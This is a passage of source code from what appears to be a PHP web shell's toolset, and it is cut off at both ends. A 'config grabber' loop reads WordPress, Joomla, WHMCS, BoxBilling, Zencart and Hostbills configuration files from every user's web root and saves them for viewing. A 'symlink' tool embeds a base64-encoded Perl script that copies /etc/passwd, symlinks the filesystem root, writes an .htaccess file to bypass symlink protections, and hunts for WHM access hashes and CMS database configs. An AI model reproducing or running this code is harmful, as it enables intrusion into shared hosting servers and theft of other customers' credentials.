						"$user_docroot/site/wp-config.php" => "Wordpress",
						"$user_docroot/wp/wp-config.php" => "Wordpress",
						"$user_docroot/WP/wp-config.php" => "Wordpress",
						"$user_docroot/news/wp-config.php" => "Wordpress",
						"$user_docroot/wordpress/wp-config.php" => "Wordpress",
						"$user_docroot/test/wp-config.php" => "Wordpress",
						"$user_docroot/demo/wp-config.php" => "Wordpress",
						"$user_docroot/home/wp-config.php" => "Wordpress",
						"$user_docroot/v1/wp-config.php" => "Wordpress",
						"$user_docroot/v2/wp-config.php" => "Wordpress",
						"$user_docroot/press/wp-config.php" => "Wordpress",
						"$user_docroot/new/wp-config.php" => "Wordpress",
						"$user_docroot/blogs/wp-config.php" => "Wordpress",
						"$user_docroot/configuration.php" => "Joomla",
						"$user_docroot/blog/configuration.php" => "Joomla",
						"$user_docroot/submitticket.php" => "^WHMCS",
						"$user_docroot/cms/configuration.php" => "Joomla",
						"$user_docroot/beta/configuration.php" => "Joomla",
						"$user_docroot/portal/configuration.php" => "Joomla",
						"$user_docroot/site/configuration.php" => "Joomla",
						"$user_docroot/main/configuration.php" => "Joomla",
						"$user_docroot/home/configuration.php" => "Joomla",
						"$user_docroot/demo/configuration.php" => "Joomla",
						"$user_docroot/test/configuration.php" => "Joomla",
						"$user_docroot/v1/configuration.php" => "Joomla",
						"$user_docroot/v2/configuration.php" => "Joomla",
						"$user_docroot/joomla/configuration.php" => "Joomla",
						"$user_docroot/new/configuration.php" => "Joomla",
						"$user_docroot/WHMCS/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs1/submitticket.php" => "WHMCS",
						"$user_docroot/Whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/WHMC/submitticket.php" => "WHMCS",
						"$user_docroot/Whmc/submitticket.php" => "WHMCS",
						"$user_docroot/whmc/submitticket.php" => "WHMCS",
						"$user_docroot/WHM/submitticket.php" => "WHMCS",
						"$user_docroot/Whm/submitticket.php" => "WHMCS",
						"$user_docroot/whm/submitticket.php" => "WHMCS",
						"$user_docroot/HOST/submitticket.php" => "WHMCS",
						"$user_docroot/Host/submitticket.php" => "WHMCS",
						"$user_docroot/host/submitticket.php" => "WHMCS",
						"$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
						"$user_docroot/Supportes/submitticket.php" => "WHMCS",
						"$user_docroot/supportes/submitticket.php" => "WHMCS",
						"$user_docroot/domains/submitticket.php" => "WHMCS",
						"$user_docroot/domain/submitticket.php" => "WHMCS",
						"$user_docroot/Hosting/submitticket.php" => "WHMCS",
						"$user_docroot/HOSTING/submitticket.php" => "WHMCS",
						"$user_docroot/hosting/submitticket.php" => "WHMCS",
						"$user_docroot/CART/submitticket.php" => "WHMCS",
						"$user_docroot/Cart/submitticket.php" => "WHMCS",
						"$user_docroot/cart/submitticket.php" => "WHMCS",
						"$user_docroot/ORDER/submitticket.php" => "WHMCS",
						"$user_docroot/Order/submitticket.php" => "WHMCS",
						"$user_docroot/order/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENT/submitticket.php" => "WHMCS",
						"$user_docroot/Client/submitticket.php" => "WHMCS",
						"$user_docroot/client/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
						"$user_docroot/Clientarea/submitticket.php" => "WHMCS",
						"$user_docroot/clientarea/submitticket.php" => "WHMCS",
						"$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
						"$user_docroot/Support/submitticket.php" => "WHMCS",
						"$user_docroot/support/submitticket.php" => "WHMCS",
						"$user_docroot/BILLING/submitticket.php" => "WHMCS",
						"$user_docroot/Billing/submitticket.php" => "WHMCS",
						"$user_docroot/billing/submitticket.php" => "WHMCS",
						"$user_docroot/BUY/submitticket.php" => "WHMCS",
						"$user_docroot/Buy/submitticket.php" => "WHMCS",
						"$user_docroot/buy/submitticket.php" => "WHMCS",
						"$user_docroot/MANAGE/submitticket.php" => "WHMCS",
						"$user_docroot/Manage/submitticket.php" => "WHMCS",
						"$user_docroot/manage/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
						"$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
						"$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
						"$user_docroot/clientsupport/submitticket.php" => "WHMCS",
						"$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
						"$user_docroot/Checkout/submitticket.php" => "WHMCS",
						"$user_docroot/checkout/submitticket.php" => "WHMCS",
						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
						"$user_docroot/Billings/submitticket.php" => "WHMCS",
						"$user_docroot/billings/submitticket.php" => "WHMCS",
						"$user_docroot/BASKET/submitticket.php" => "WHMCS",
						"$user_docroot/Basket/submitticket.php" => "WHMCS",
						"$user_docroot/basket/submitticket.php" => "WHMCS",
						"$user_docroot/SECURE/submitticket.php" => "WHMCS",
						"$user_docroot/Secure/submitticket.php" => "WHMCS",
						"$user_docroot/secure/submitticket.php" => "WHMCS",
						"$user_docroot/SALES/submitticket.php" => "WHMCS",
						"$user_docroot/Sales/submitticket.php" => "WHMCS",
						"$user_docroot/sales/submitticket.php" => "WHMCS",
						"$user_docroot/BILL/submitticket.php" => "WHMCS",
						"$user_docroot/Bill/submitticket.php" => "WHMCS",
						"$user_docroot/bill/submitticket.php" => "WHMCS",
						"$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
						"$user_docroot/Purchase/submitticket.php" => "WHMCS",
						"$user_docroot/purchase/submitticket.php" => "WHMCS",
						"$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
						"$user_docroot/Account/submitticket.php" => "WHMCS",
						"$user_docroot/account/submitticket.php" => "WHMCS",
						"$user_docroot/USER/submitticket.php" => "WHMCS",
						"$user_docroot/User/submitticket.php" => "WHMCS",
						"$user_docroot/user/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
						"$user_docroot/Clients/submitticket.php" => "WHMCS",
						"$user_docroot/clients/submitticket.php" => "WHMCS",
						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
						"$user_docroot/Billings/submitticket.php" => "WHMCS",
						"$user_docroot/billings/submitticket.php" => "WHMCS",
						"$user_docroot/MY/submitticket.php" => "WHMCS",
						"$user_docroot/My/submitticket.php" => "WHMCS",
						"$user_docroot/my/submitticket.php" => "WHMCS",
						"$user_docroot/secure/whm/submitticket.php" => "WHMCS",
						"$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/panel/submitticket.php" => "WHMCS",
						"$user_docroot/clientes/submitticket.php" => "WHMCS",
						"$user_docroot/cliente/submitticket.php" => "WHMCS",
						"$user_docroot/support/order/submitticket.php" => "WHMCS",
						"$user_docroot/bb-config.php" => "BoxBilling",
						"$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
						"$user_docroot/box/bb-config.php" => "BoxBilling",
						"$user_docroot/host/bb-config.php" => "BoxBilling",
						"$user_docroot/Host/bb-config.php" => "BoxBilling",
						"$user_docroot/supportes/bb-config.php" => "BoxBilling",
						"$user_docroot/support/bb-config.php" => "BoxBilling",
						"$user_docroot/hosting/bb-config.php" => "BoxBilling",
						"$user_docroot/cart/bb-config.php" => "BoxBilling",
						"$user_docroot/order/bb-config.php" => "BoxBilling",
						"$user_docroot/client/bb-config.php" => "BoxBilling",
						"$user_docroot/clients/bb-config.php" => "BoxBilling",
						"$user_docroot/cliente/bb-config.php" => "BoxBilling",
						"$user_docroot/clientes/bb-config.php" => "BoxBilling",
						"$user_docroot/billing/bb-config.php" => "BoxBilling",
						"$user_docroot/billings/bb-config.php" => "BoxBilling",
						"$user_docroot/my/bb-config.php" => "BoxBilling",
						"$user_docroot/secure/bb-config.php" => "BoxBilling",
						"$user_docroot/support/order/bb-config.php" => "BoxBilling",
						"$user_docroot/includes/dist-configure.php" => "Zencart",
						"$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
						"$user_docroot/products/includes/dist-configure.php" => "Zencart",
						"$user_docroot/cart/includes/dist-configure.php" => "Zencart",
						"$user_docroot/shop/includes/dist-configure.php" => "Zencart",
						"$user_docroot/includes/iso4217.php" => "Hostbills",
						"$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
						"$user_docroot/host/includes/iso4217.php" => "Hostbills",
						"$user_docroot/Host/includes/iso4217.php" => "Hostbills",
						"$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
						"$user_docroot/support/includes/iso4217.php" => "Hostbills",
						"$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
						"$user_docroot/cart/includes/iso4217.php" => "Hostbills",
						"$user_docroot/order/includes/iso4217.php" => "Hostbills",
						"$user_docroot/client/includes/iso4217.php" => "Hostbills",
						"$user_docroot/clients/includes/iso4217.php" => "Hostbills",
						"$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
						"$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
						"$user_docroot/billing/includes/iso4217.php" => "Hostbills",
						"$user_docroot/billings/includes/iso4217.php" => "Hostbills",
						"$user_docroot/my/includes/iso4217.php" => "Hostbills",
						"$user_docroot/secure/includes/iso4217.php" => "Hostbills",
						"$user_docroot/support/order/includes/iso4217.php" => "Hostbills");
					
					foreach($getconfig as $config => $userconfig) {
						$get = file_get_contents($config);
						if($get == '') {
						}
						else {
							$fopen = fopen("idx_config/$user-$userconfig.txt", "w");
							fputs($fopen, $get);
						}
					}
				}
			} //foreach
		}
		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'><iframe>";
		print "</div>";
	}
	elseif($toolsname === "symlink") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_sym'."));
		if(!is_dir(path()."/idx_sym/")) {
			$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxOTk5DQojCQlUaGFua3MgVG8gOiAweElEaW90ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1JTUU6OkJhc2U2NDsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJpZHhfc3ltIjsNCnN5bWxpbmsoIi8iLCJpZHhfc3ltL3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFlTRlJOVENBclNGUk5URlJoWW14bElDdFRkWEJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMyTnlhWEIwYVc5dUlDdE9ZVzFsVjJsa2RHZzlLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJTVU5CWjBsbVFXaHJhVUZCUVVGQmJIZFRSbXg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpvTUZVeU9XMWtTR1JvWTIxVlFXUXpaRE5NYld4MVlUTk9hbGxZUW14TWJUbDVXalYyZFZCQ2IwRkJRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdITnlWekJIZDBWUmRGSjNWa3ROVW5SQlZUaGFZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSWTNjMlJFWkJMMVZFVlVGQldVaElhamhvVDBGVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFYTk1WbU52YlZwTFJGQTJNV3RGVEdsb1IwbEtPVkZDWjA4eWFtUnpTVVV2U21JMVQyRmpSMFpCZDBSUlJXVk5SVTlhYm1neFJYRk5RMmgwVTBJNFlUWTBRbGN5VFU1b04xRldhV2hEUjB0alRraHpkMjFhTUd4QmExbEllRVkwVVdoQ1VFTkxTVmxTVlRsc05qQTFTMjFIUTBWSlZWbDZkRU5aVFVKbWEwVnFSMW8wVDJsSWQxSlJSaXQyYTFGSEszQjBRVU5KUmxKRlNsWlFVVUYyUm1ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkwTEdsV1FrOVNkekJMUjJkdlFVRkJRVTVUVldoRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXWTRMemxvUVVGQlFVRllUbE5TTUVsQmNuTTBZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01GTlZNVVpDT1c5S1FtaGpWRXAyTWtJeVpEUkJRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJOTXpoQ1RtZEtVVzFSWjBwSFpDdEJMMDFSUWt4M1IycHBkMGd6Ym5ka2ExTk1kRTh5ZUVWU1J6Vk1jWGhZVWxOSlVqSlpSR1pFTkVkclIwMHdVRE55WWpSaU9WQkJlakJzTjNCVGJGZHNWekJtYm01TWIyeEJTVkJDTkZCWWFEUmxSblZ1ZFdOQlNVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWhTS3k4dmVuWktUWHBUZVVwTFMyOWthVWxuT0VGWVlYaGxTWG94WWtSYU4wMTRjVTVtZEdkVFZWSkVWM2szVEZWdVdqQmtXVzE0UVVaQlZrVnNTVFpCUlVONVowbHpVVkZ6YVhwTVFrOUJRa0ZFVDJwTFFYQnhhRGQxTjBkdlExVlhhWGRaWW1WMGIxVkljbkpRWTNkRGNXOUdNa3RWWlZoTWVrVjZRbll3SzNWUmJWTklUVVZhT1VZMlUxcGpjalpwTkVselFrOWhMMkkzU0ZGTllVaDBTVUYzWjB4a1NHRnNSRUV4WlhZd1pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF4TXpKdFRXdEtjbWsxZFZOUGJFWm9SV2h3VlZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhKTkhaaFpXOWhWbGd3WTJKVFpHaHRWVkl6ZWtGTGRrNXFXVFpXYVc5dk1IUlhlbWRGYjI1TFlsY3JTMnRIVjNRelZXNTBNRU5sUjJaS2N6bG5LMVZWTUhKRlIwaElMMGgzTDAxcVNEWXZWQ3RRVDJSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxRTJTSEJPVVRJM2REWnpRVU5FVTA1aGJubHZiR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0zTDA5RWF6VkhZU3RaTms4MVRYRjViVTUzTTFZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JYTXJjWFpuTkU5RWVqaG1TSGd3TDB4elltVXpPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT05TOU9NRmRhWW5Sc2VUbG1NRGx1V2pKYUwySXlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNVTkRSamt2VUZSd1EyeG9jRUoyWjFCbGJHOU1PVlUxTlU1SlFVRkJRVUZCVTFWV1QxSkxOVU5aU1VrOUp3MEtTVzVrWlhoSloyNXZjbVVnS2k1MGVIUTBNRFFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMzTW5EUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCcGJtUnZlSEJzYjJsMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VERTVPVGt1ZEhoMERRcFRZWFJwYzJaNUlFRnVlUTBLU1c1a1pYaFBjSFJwYjI1eklFbG5ibTl5WlVOaGMyVWdSbUZ1WTNsSmJtUmxlR2x1WnlCR2IyeGtaWEp6Um1seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQTZMeTlsZG1WdWRDNXBibVJ2ZUhCc2IybDBMbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2lkeF9zeW0vLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdpZHhfc3ltL25lbXUudHh0Jyk7DQpwcmludCAkeHggIiRzeW0iOw0KY2xvc2UgJHh4Ow0Kb3BlbihteSAkZmgsICc8OmVuY29kaW5nKFVURi04KScsICRmaWxlbmFtZSk7DQp3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7DQpteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7DQpteSAkdXNlcm55YSA9ICQxOw0KbXkgQGFycmF5ID0gKA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy8uYWNjZXNzaGFzaCcsIHR5cGUgPT4gJ1dITS1hY2Nlc3NoYXNoJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywgdHlwZSA9PiAnT3BlbkNhcnQnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlv